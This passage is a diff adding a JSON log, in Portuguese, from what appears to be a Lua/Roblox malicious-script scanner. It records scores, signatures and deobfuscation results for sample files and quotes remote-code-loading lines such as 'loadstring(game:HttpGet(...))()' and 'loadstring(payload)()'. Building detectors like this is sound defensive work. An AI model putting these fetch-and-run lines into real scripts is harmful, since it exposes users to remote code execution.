+      "message": "[VULN-CI-001] Uso de loadstring em sample_code_injection.lua (linha 1) - CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "DATA_EXFILTRATION",
+        "description": "Requisições HTTP para domínios não-Roblox podem indicar exfiltração de dados.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/user/repo/main/script.lua\"))()",
+        "line_number": 1,
+        "matched_text": "HttpGet",
+        "name": "Requisição HTTP para domínio externo",
+        "remediation": "Bloquear requisições para domínios não autorizados. Usar whitelist de domínios.",
+        "severity": "HIGH",
+        "source": "sample_code_injection.lua",
+        "vuln_id": "VULN-DE-001"
+      },
+      "id": 45,
+      "level": "WARN",
+      "message": "[VULN-DE-001] Requisição HTTP para domínio externo em sample_code_injection.lua (linha 1) - HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "PRIVILEGE_ESCALATION",
+        "description": "Acesso ao ambiente global permite modificar variáveis e funções compartilhadas.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "local env = getgenv()",
+        "line_number": 2,
+        "matched_text": "getgenv",
+        "name": "Acesso a ambiente global",
+        "remediation": "Isolar ambientes de execução. Monitorar acessos a ambientes globais.",
+        "severity": "HIGH",
+        "source": "sample_code_injection.lua",
+        "vuln_id": "VULN-PE-001"
+      },
+      "id": 46,
+      "level": "WARN",
+      "message": "[VULN-PE-001] Acesso a ambiente global em sample_code_injection.lua (linha 2) - HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SIGNATURE",
+      "data": {
+        "category": "CODE_INJECTION",
+        "description": "Carregamento de script Lua de repositório GitHub.",
+        "line_number": 1,
+        "matched_text": "raw.githubusercontent.com/user/repo/main/script.lua",
+        "severity": "HIGH",
+        "signature_id": "SIG-DE-003",
+        "signature_name": "GitHub Raw Script Loader",
+        "source": "sample_code_injection.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 47,
+      "level": "WARN",
+      "message": "[SIG-DE-003] GitHub Raw Script Loader detectado em sample_code_injection.lua (linha 1) - HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SIGNATURE",
+      "data": {
+        "category": "CODE_INJECTION",
+        "description": "Execução de código remoto via loadstring + HttpGet.",
+        "line_number": 1,
+        "matched_text": "loadstring(game:HttpGet",
+        "severity": "CRITICAL",
+        "signature_id": "SIG-CI-001",
+        "signature_name": "Remote Code Execution",
+        "source": "sample_code_injection.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 48,
+      "level": "WARN",
+      "message": "[SIG-CI-001] Remote Code Execution detectado em sample_code_injection.lua (linha 1) - CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "HEURISTIC",
+      "data": {
+        "best_multiplier": 2.5,
+        "color": "⚫",
+        "combos": [
+          {
+            "indicators": [
+              "loadstring",
+              "HttpGet"
+            ],
+            "multiplier": 2.5,
+            "name": "Remote Code Execution",
+            "severity": "CRITICAL"
+          }
+        ],
+        "context": {
+          "adjustment": 5,
+          "code_length": 162,
+          "factors": [
+            {
+              "adjustment": 5,
+              "description": "Script pequeno com indicadores - mais suspeito",
+              "factor": "SMALL_SCRIPT"
+            }
+          ],
+          "line_count": 4
+        },
+        "indicators": {
+          "HttpGet": {
+            "count": 1,
+            "points": 4,
+            "weight": 4
+          },
+          "game:HttpGet": {
+            "count": 1,
+            "points": 5,
+            "weight": 5
+          },
+          "getgenv": {
+            "count": 1,
+            "points": 6,
+            "weight": 6
+          },
+          "loadstring": {
+            "count": 1,
+            "points": 8,
+            "weight": 8
+          }
+        },
+        "level": "CRITICAL",
+        "score": 62,
+        "source": "sample_code_injection.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 49,
+      "level": "INFO",
+      "message": "⚫ Score: 62 (CRITICAL) para sample_code_injection.lua [4 indicadores, 1 combos]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PAYLOAD",
+      "data": {
+        "description": "Execução de código remoto via loadstring + HttpGet",
+        "pattern_name": "loadstring + HttpGet",
+        "severity": "CRITICAL",
+        "source": "sample_code_injection.lua",
+        "timestamp": "2026-04-16T11:41:35Z",
+        "urls": [
+          "https://raw.githubusercontent.com/user/repo/main/script.lua"
+        ]
+      },
+      "id": 50,
+      "level": "WARN",
+      "message": "[CRITICAL] loadstring + HttpGet em sample_code_injection.lua - 1 URLs capturadas",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PAYLOAD",
+      "data": {
+        "description": "URL de script remoto detectada via HttpGet",
+        "pattern_name": "Direct URL execution",
+        "severity": "HIGH",
+        "source": "sample_code_injection.lua",
+        "timestamp": "2026-04-16T11:41:35Z",
+        "urls": [
+          "https://raw.githubusercontent.com/user/repo/main/script.lua"
+        ]
+      },
+      "id": 51,
+      "level": "WARN",
+      "message": "[HIGH] Direct URL execution em sample_code_injection.lua - 1 URLs capturadas",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PAYLOAD",
+      "data": {
+        "description": "Carregamento de script de GitHub raw",
+        "pattern_name": "Raw GitHub loader",
+        "severity": "HIGH",
+        "source": "sample_code_injection.lua",
+        "timestamp": "2026-04-16T11:41:35Z",
+        "urls": [
+          "https://raw.githubusercontent.com/user/repo/main/script.lua"
+        ]
+      },
+      "id": 52,
+      "level": "WARN",
+      "message": "[HIGH] Raw GitHub loader em sample_code_injection.lua - 1 URLs capturadas",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 53,
+      "level": "DEBUG",
+      "message": "Alerta aprovado: source=sample_code_injection.lua, score=62→62, severity=CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 54,
+      "level": "DEBUG",
+      "message": "Alerta aprovado: source=sample_code_injection.lua, score=62→62, severity=HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 55,
+      "level": "DEBUG",
+      "message": "Alerta aprovado: source=sample_code_injection.lua, score=62→62, severity=HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "behavior": {
+          "count": 0,
+          "detections": {}
+        },
+        "code_length": 162,
+        "deobfuscation": {
+          "transformations": {},
+          "was_obfuscated": false
+        },
+        "false_positive": {
+          "alerts_passed": 3,
+          "alerts_suppressed": 0
+        },
+        "filter_matches": [
+          {
+            "line_content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/user/repo/main/script.lua\"))()",
+            "line_number": 1,
+            "matched_text": "loadstring",
+            "pattern": "loadstring",
+            "position": {
+              "finish": 18,
+              "start": 9
+            },
+            "severity": "HIGH",
+            "source": "sample_code_injection.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          },
+          {
+            "line_content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/user/repo/main/script.lua\"))()",
+            "line_number": 1,
+            "matched_text": "HttpGet",
+            "pattern": "HttpGet",
+            "position": {
+              "finish": 31,
+              "start": 25
+            },
+            "severity": "HIGH",
+            "source": "sample_code_injection.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          },
+          {
+            "line_content": "local env = getgenv()",
+            "line_number": 2,
+            "matched_text": "getgenv",
+            "pattern": "getgenv",
+            "position": {
+              "finish": 125,
+              "start": 119
+            },
+            "severity": "HIGH",
+            "source": "sample_code_injection.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          }
+        ],
+        "heuristic": {
+          "best_multiplier": 2.5,
+          "color": "⚫",
+          "combos": [
+            {
+              "indicators": [
+                "loadstring",
+                "HttpGet"
+              ],
+              "multiplier": 2.5,
+              "name": "Remote Code Execution",
+              "severity": "CRITICAL"
+            }
+          ],
+          "context": {
+            "adjustment": 5,
+            "code_length": 162,
+            "factors": [
+              {
+                "adjustment": 5,
+                "description": "Script pequeno com indicadores - mais suspeito",
+                "factor": "SMALL_SCRIPT"
+              }
+            ],
+            "line_count": 4
+          },
+          "indicators": {
+            "HttpGet": {
+              "count": 1,
+              "points": 4,
+              "weight": 4
+            },
+            "game:HttpGet": {
+              "count": 1,
+              "points": 5,
+              "weight": 5
+            },
+            "getgenv": {
+              "count": 1,
+              "points": 6,
+              "weight": 6
+            },
+            "loadstring": {
+              "count": 1,
+              "points": 8,
+              "weight": 8
+            }
+          },
+          "level": "CRITICAL",
+          "score": 62,
+          "source": "sample_code_injection.lua",
+          "timestamp": "2026-04-16T11:41:35Z"
+        },
+        "hooks": {
+          "count": 0,
+          "patterns": {}
+        },
+        "match_count": 3,
+        "payloads": {
+          "count": 3,
+          "detections": [
+            {
+              "description": "Execução de código remoto via loadstring + HttpGet",
+              "pattern_name": "loadstring + HttpGet",
+              "severity": "CRITICAL",
+              "source": "sample_code_injection.lua",
+              "timestamp": "2026-04-16T11:41:35Z",
+              "urls": [
+                "https://raw.githubusercontent.com/user/repo/main/script.lua"
+              ]
+            },
+            {
+              "description": "URL de script remoto detectada via HttpGet",
+              "pattern_name": "Direct URL execution",
+              "severity": "HIGH",
+              "source": "sample_code_injection.lua",
+              "timestamp": "2026-04-16T11:41:35Z",
+              "urls": [
+                "https://raw.githubusercontent.com/user/repo/main/script.lua"
+              ]
+            },
+            {
+              "description": "Carregamento de script de GitHub raw",
+              "pattern_name": "Raw GitHub loader",
+              "severity": "HIGH",
+              "source": "sample_code_injection.lua",
+              "timestamp": "2026-04-16T11:41:35Z",
+              "urls": [
+                "https://raw.githubusercontent.com/user/repo/main/script.lua"
+              ]
+            }
+          ]
+        },
+        "signatures": {
+          "count": 2,
+          "detections": [
+            {
+              "category": "CODE_INJECTION",
+              "description": "Carregamento de script Lua de repositório GitHub.",
+              "line_number": 1,
+              "matched_text": "raw.githubusercontent.com/user/repo/main/script.lua",
+              "severity": "HIGH",
+              "signature_id": "SIG-DE-003",
+              "signature_name": "GitHub Raw Script Loader",
+              "source": "sample_code_injection.lua",
+              "timestamp": "2026-04-16T11:41:35Z"
+            },
+            {
+              "category": "CODE_INJECTION",
+              "description": "Execução de código remoto via loadstring + HttpGet.",
+              "line_number": 1,
+              "matched_text": "loadstring(game:HttpGet",
+              "severity": "CRITICAL",
+              "signature_id": "SIG-CI-001",
+              "signature_name": "Remote Code Execution",
+              "source": "sample_code_injection.lua",
+              "timestamp": "2026-04-16T11:41:35Z"
+            }
+          ]
+        },
+        "source": "sample_code_injection.lua",
+        "vulnerabilities": [
+          {
+            "category": "CODE_INJECTION",
+            "description": "Uso de loadstring permite execução de código arbitrário e pode ser explorado para injeção de código malicioso.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/user/repo/main/script.lua\"))()",
+            "line_number": 1,
+            "matched_text": "loadstring",
+            "name": "Uso de loadstring",
+            "remediation": "Evitar uso de loadstring. Usar alternativas seguras como módulos pré-compilados.",
+            "severity": "CRITICAL",
+            "source": "sample_code_injection.lua",
+            "vuln_id": "VULN-CI-001"
+          },
+          {
+            "category": "DATA_EXFILTRATION",
+            "description": "Requisições HTTP para domínios não-Roblox podem indicar exfiltração de dados.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/user/repo/main/script.lua\"))()",
+            "line_number": 1,
+            "matched_text": "HttpGet",
+            "name": "Requisição HTTP para domínio externo",
+            "remediation": "Bloquear requisições para domínios não autorizados. Usar whitelist de domínios.",
+            "severity": "HIGH",
+            "source": "sample_code_injection.lua",
+            "vuln_id": "VULN-DE-001"
+          },
+          {
+            "category": "PRIVILEGE_ESCALATION",
+            "description": "Acesso ao ambiente global permite modificar variáveis e funções compartilhadas.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "local env = getgenv()",
+            "line_number": 2,
+            "matched_text": "getgenv",
+            "name": "Acesso a ambiente global",
+            "remediation": "Isolar ambientes de execução. Monitorar acessos a ambientes globais.",
+            "severity": "HIGH",
+            "source": "sample_code_injection.lua",
+            "vuln_id": "VULN-PE-001"
+          }
+        ],
+        "vulnerability_count": 3
+      },
+      "id": 56,
+      "level": "INFO",
+      "message": "Análise concluída: 3 padrões, 3 vulns, 2 assinaturas, score 62 (CRITICAL)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 57,
+      "level": "INFO",
+      "message": "Analisando código: sample_safe_code.lua (1027 caracteres)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INCREMENTAL",
+      "id": 58,
+      "level": "DEBUG",
+      "message": "Novo script: sample_safe_code.lua (hash: 2e9ae400)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "HEURISTIC",
+      "data": {
+        "best_multiplier": 1.0,
+        "color": "🟢",
+        "combos": {},
+        "context": {
+          "adjustment": 0,
+          "code_length": 1027,
+          "factors": {},
+          "line_count": 32
+        },
+        "indicators": {},
+        "level": "NONE",
+        "score": 0,
+        "source": "sample_safe_code.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 59,
+      "level": "INFO",
+      "message": "🟢 Score: 0 (NONE) para sample_safe_code.lua [0 indicadores, 0 combos]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "behavior": {
+          "count": 0,
+          "detections": {}
+        },
+        "code_length": 1027,
+        "deobfuscation": {
+          "transformations": {},
+          "was_obfuscated": false
+        },
+        "false_positive": {
+          "alerts_passed": 0,
+          "alerts_suppressed": 0
+        },
+        "filter_matches": {},
+        "heuristic": {
+          "best_multiplier": 1.0,
+          "color": "🟢",
+          "combos": {},
+          "context": {
+            "adjustment": 0,
+            "code_length": 1027,
+            "factors": {},
+            "line_count": 32
+          },
+          "indicators": {},
+          "level": "NONE",
+          "score": 0,
+          "source": "sample_safe_code.lua",
+          "timestamp": "2026-04-16T11:41:35Z"
+        },
+        "hooks": {
+          "count": 1,
+          "patterns": [
+            {
+              "description": "Padrão de hooking '__index override' encontrado em sample_safe_code.lua",
+              "pattern": "__index override",
+              "severity": "HIGH",
+              "source": "sample_safe_code.lua"
+            }
+          ]
+        },
+        "match_count": 0,
+        "payloads": {
+          "count": 0,
+          "detections": {}
+        },
+        "signatures": {
+          "count": 0,
+          "detections": {}
+        },
+        "source": "sample_safe_code.lua",
+        "vulnerabilities": {},
+        "vulnerability_count": 0
+      },
+      "id": 60,
+      "level": "INFO",
+      "message": "Análise concluída: 0 padrões, 0 vulns, 0 assinaturas, score 0 (NONE)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 61,
+      "level": "INFO",
+      "message": "Analisando código: sample_obfuscated.lua (288 caracteres)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INCREMENTAL",
+      "id": 62,
+      "level": "DEBUG",
+      "message": "Novo script: sample_obfuscated.lua (hash: 4c04f8f6)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "DEOBFUSCATOR",
+      "id": 63,
+      "level": "INFO",
+      "message": "3 transformações aplicadas em sample_obfuscated.lua",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local _0x1 = \"loadstring\"",
+        "line_number": 1,
+        "matched_text": "loadstring",
+        "pattern": "loadstring",
+        "position": {
+          "finish": 32,
+          "start": 23
+        },
+        "severity": "HIGH",
+        "source": "sample_obfuscated.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 64,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'loadstring' em sample_obfuscated.lua (linha 1) [HIGH]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "CODE_INJECTION",
+        "description": "Uso de loadstring permite execução de código arbitrário e pode ser explorado para injeção de código malicioso.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "local _0x1 = \"loadstring\"",
+        "line_number": 1,
+        "matched_text": "loadstring",
+        "name": "Uso de loadstring",
+        "remediation": "Evitar uso de loadstring. Usar alternativas seguras como módulos pré-compilados.",
+        "severity": "CRITICAL",
+        "source": "sample_obfuscated.lua",
+        "vuln_id": "VULN-CI-001"
+      },
+      "id": 65,
+      "level": "WARN",
+      "message": "[VULN-CI-001] Uso de loadstring em sample_obfuscated.lua (linha 1) - CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "HEURISTIC",
+      "data": {
+        "best_multiplier": 1.0,
+        "color": "🟡",
+        "combos": {},
+        "context": {
+          "adjustment": 0,
+          "code_length": 231,
+          "factors": {},
+          "line_count": 7
+        },
+        "indicators": {
+          "loadstring": {
+            "count": 1,
+            "points": 8,
+            "weight": 8
+          }
+        },
+        "level": "LOW",
+        "score": 8,
+        "source": "sample_obfuscated.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 66,
+      "level": "INFO",
+      "message": "🟡 Score: 8 (LOW) para sample_obfuscated.lua [1 indicadores, 0 combos]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 67,
+      "level": "INFO",
+      "message": "Filtrado: 0 alertas passaram, 1 suprimidos",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "behavior": {
+          "count": 0,
+          "detections": {}
+        },
+        "code_length": 288,
+        "deobfuscation": {
+          "transformations": [
+            {
+              "count": 3,
+              "description": "Unidas 3 concatenações de string",
+              "type": "STRING_JOIN"
+            },
+            {
+              "count": 1,
+              "description": "Resolvidas 1 chamadas string.char",
+              "type": "STRING_CHAR_RESOLVE"
+            },
+            {
+              "count": 1,
+              "description": "Detectadas 1 strings base64",
+              "detections": [
+                {
+                  "decoded": "https://example.com/script.lua",
+                  "decoded_length": 30,
+                  "encoded": "aHR0cHM6Ly9leGFtcGxlLmNvbS9zY3JpcHQubHVh",
+                  "encoded_length": 40
+                }
+              ],
+              "type": "BASE64_DETECT"
+            }
+          ],
+          "was_obfuscated": true
+        },
+        "false_positive": {
+          "alerts_passed": 0,
+          "alerts_suppressed": 1
+        },
+        "filter_matches": [
+          {
+            "line_content": "local _0x1 = \"loadstring\"",
+            "line_number": 1,
+            "matched_text": "loadstring",
+            "pattern": "loadstring",
+            "position": {
+              "finish": 32,
+              "start": 23
+            },
+            "severity": "HIGH",
+            "source": "sample_obfuscated.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          }
+        ],
+        "heuristic": {
+          "best_multiplier": 1.0,
+          "color": "🟡",
+          "combos": {},
+          "context": {
+            "adjustment": 0,
+            "code_length": 231,
+            "factors": {},
+            "line_count": 7
+          },
+          "indicators": {
+            "loadstring": {
+              "count": 1,
+              "points": 8,
+              "weight": 8
+            }
+          },
+          "level": "LOW",
+          "score": 8,
+          "source": "sample_obfuscated.lua",
+          "timestamp": "2026-04-16T11:41:35Z"
+        },
+        "hooks": {
+          "count": 0,
+          "patterns": {}
+        },
+        "match_count": 1,
+        "payloads": {
+          "count": 0,
+          "detections": {}
+        },
+        "signatures": {
+          "count": 0,
+          "detections": {}
+        },
+        "source": "sample_obfuscated.lua",
+        "vulnerabilities": [
+          {
+            "category": "CODE_INJECTION",
+            "description": "Uso de loadstring permite execução de código arbitrário e pode ser explorado para injeção de código malicioso.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "local _0x1 = \"loadstring\"",
+            "line_number": 1,
+            "matched_text": "loadstring",
+            "name": "Uso de loadstring",
+            "remediation": "Evitar uso de loadstring. Usar alternativas seguras como módulos pré-compilados.",
+            "severity": "CRITICAL",
+            "source": "sample_obfuscated.lua",
+            "vuln_id": "VULN-CI-001"
+          }
+        ],
+        "vulnerability_count": 1
+      },
+      "id": 68,
+      "level": "INFO",
+      "message": "Análise concluída: 1 padrões, 1 vulns, 0 assinaturas, score 8 (LOW)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 69,
+      "level": "INFO",
+      "message": "Analisando código: chain_downloader.lua (144 caracteres)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INCREMENTAL",
+      "id": 70,
+      "level": "DEBUG",
+      "message": "Novo script: chain_downloader.lua (hash: 1fcd744b)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local data = game:HttpGet(\"https://example.com/payload.lua\")",
+        "line_number": 1,
+        "matched_text": "HttpGet",
+        "pattern": "HttpGet",
+        "position": {
+          "finish": 33,
+          "start": 27
+        },
+        "severity": "HIGH",
+        "source": "chain_downloader.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 71,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'HttpGet' em chain_downloader.lua (linha 1) [HIGH]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "DATA_EXFILTRATION",
+        "description": "Requisições HTTP para domínios não-Roblox podem indicar exfiltração de dados.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "local data = game:HttpGet(\"https://example.com/payload.lua\")",
+        "line_number": 1,
+        "matched_text": "HttpGet",
+        "name": "Requisição HTTP para domínio externo",
+        "remediation": "Bloquear requisições para domínios não autorizados. Usar whitelist de domínios.",
+        "severity": "HIGH",
+        "source": "chain_downloader.lua",
+        "vuln_id": "VULN-DE-001"
+      },
+      "id": 72,
+      "level": "WARN",
+      "message": "[VULN-DE-001] Requisição HTTP para domínio externo em chain_downloader.lua (linha 1) - HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "HEURISTIC",
+      "data": {
+        "best_multiplier": 1.0,
+        "color": "🟠",
+        "combos": {},
+        "context": {
+          "adjustment": 5,
+          "code_length": 144,
+          "factors": [
+            {
+              "adjustment": 5,
+              "description": "Script pequeno com indicadores - mais suspeito",
+              "factor": "SMALL_SCRIPT"
+            }
+          ],
+          "line_count": 4
+        },
+        "indicators": {
+          "HttpGet": {
+            "count": 1,
+            "points": 4,
+            "weight": 4
+          },
+          "game:HttpGet": {
+            "count": 1,
+            "points": 5,
+            "weight": 5
+          }
+        },
+        "level": "MEDIUM",
+        "score": 14,
+        "source": "chain_downloader.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 73,
+      "level": "INFO",
+      "message": "🟠 Score: 14 (MEDIUM) para chain_downloader.lua [2 indicadores, 0 combos]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PAYLOAD",
+      "data": {
+        "description": "URL de script remoto detectada via HttpGet",
+        "pattern_name": "Direct URL execution",
+        "severity": "HIGH",
+        "source": "chain_downloader.lua",
+        "timestamp": "2026-04-16T11:41:35Z",
+        "urls": [
+          "https://example.com/payload.lua"
+        ]
+      },
+      "id": 74,
+      "level": "WARN",
+      "message": "[HIGH] Direct URL execution em chain_downloader.lua - 1 URLs capturadas",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 75,
+      "level": "DEBUG",
+      "message": "Alerta aprovado: source=chain_downloader.lua, score=14→14, severity=HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "behavior": {
+          "count": 0,
+          "detections": {}
+        },
+        "code_length": 144,
+        "deobfuscation": {
+          "transformations": {},
+          "was_obfuscated": false
+        },
+        "false_positive": {
+          "alerts_passed": 1,
+          "alerts_suppressed": 0
+        },
+        "filter_matches": [
+          {
+            "line_content": "local data = game:HttpGet(\"https://example.com/payload.lua\")",
+            "line_number": 1,
+            "matched_text": "HttpGet",
+            "pattern": "HttpGet",
+            "position": {
+              "finish": 33,
+              "start": 27
+            },
+            "severity": "HIGH",
+            "source": "chain_downloader.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          }
+        ],
+        "heuristic": {
+          "best_multiplier": 1.0,
+          "color": "🟠",
+          "combos": {},
+          "context": {
+            "adjustment": 5,
+            "code_length": 144,
+            "factors": [
+              {
+                "adjustment": 5,
+                "description": "Script pequeno com indicadores - mais suspeito",
+                "factor": "SMALL_SCRIPT"
+              }
+            ],
+            "line_count": 4
+          },
+          "indicators": {
+            "HttpGet": {
+              "count": 1,
+              "points": 4,
+              "weight": 4
+            },
+            "game:HttpGet": {
+              "count": 1,
+              "points": 5,
+              "weight": 5
+            }
+          },
+          "level": "MEDIUM",
+          "score": 14,
+          "source": "chain_downloader.lua",
+          "timestamp": "2026-04-16T11:41:35Z"
+        },
+        "hooks": {
+          "count": 0,
+          "patterns": {}
+        },
+        "match_count": 1,
+        "payloads": {
+          "count": 1,
+          "detections": [
+            {
+              "description": "URL de script remoto detectada via HttpGet",
+              "pattern_name": "Direct URL execution",
+              "severity": "HIGH",
+              "source": "chain_downloader.lua",
+              "timestamp": "2026-04-16T11:41:35Z",
+              "urls": [
+                "https://example.com/payload.lua"
+              ]
+            }
+          ]
+        },
+        "signatures": {
+          "count": 0,
+          "detections": {}
+        },
+        "source": "chain_downloader.lua",
+        "vulnerabilities": [
+          {
+            "category": "DATA_EXFILTRATION",
+            "description": "Requisições HTTP para domínios não-Roblox podem indicar exfiltração de dados.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "local data = game:HttpGet(\"https://example.com/payload.lua\")",
+            "line_number": 1,
+            "matched_text": "HttpGet",
+            "name": "Requisição HTTP para domínio externo",
+            "remediation": "Bloquear requisições para domínios não autorizados. Usar whitelist de domínios.",
+            "severity": "HIGH",
+            "source": "chain_downloader.lua",
+            "vuln_id": "VULN-DE-001"
+          }
+        ],
+        "vulnerability_count": 1
+      },
+      "id": 76,
+      "level": "INFO",
+      "message": "Análise concluída: 1 padrões, 1 vulns, 0 assinaturas, score 14 (MEDIUM)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 77,
+      "level": "INFO",
+      "message": "Analisando código: chain_executor.lua (135 caracteres)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INCREMENTAL",
+      "id": 78,
+      "level": "DEBUG",
+      "message": "Novo script: chain_executor.lua (hash: 35f524a9)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "loadstring(payload)()",
+        "line_number": 3,
+        "matched_text": "loadstring",
+        "pattern": "loadstring",
+        "position": {
+          "finish": 119,
+          "start": 110
+        },
+        "severity": "HIGH",
+        "source": "chain_executor.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 79,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'loadstring' em chain_executor.lua (linha 3) [HIGH]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
